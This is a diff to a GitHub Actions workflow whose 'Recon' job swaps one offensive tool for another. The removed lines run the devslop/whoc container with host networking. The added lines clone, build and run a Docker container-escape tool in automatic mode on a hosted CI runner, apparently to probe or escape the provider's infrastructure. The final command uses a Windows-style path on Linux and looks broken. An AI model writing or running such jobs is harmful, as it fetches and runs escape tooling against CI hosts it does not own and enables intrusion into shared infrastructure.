@@ -4,10 +4,13 @@ jobs:
   Recon: #Each job can run for 6h max
     runs-on: ubuntu-latest
     steps:
-      - run: echo "WhoC"
+      - run: echo "Recon"
       - run: |     
-            docker pull devslop/whoc:latest
-            docker run --rm --net=host devslop/whoc:latest
+            git clone https://github.com/PercussiveElbow/docker-escape-tool
+            cd docker-escape-tool
+            shards install
+            crystal build  --static src/docker-escape.cr
+            .\docker_escape auto
 
 
 
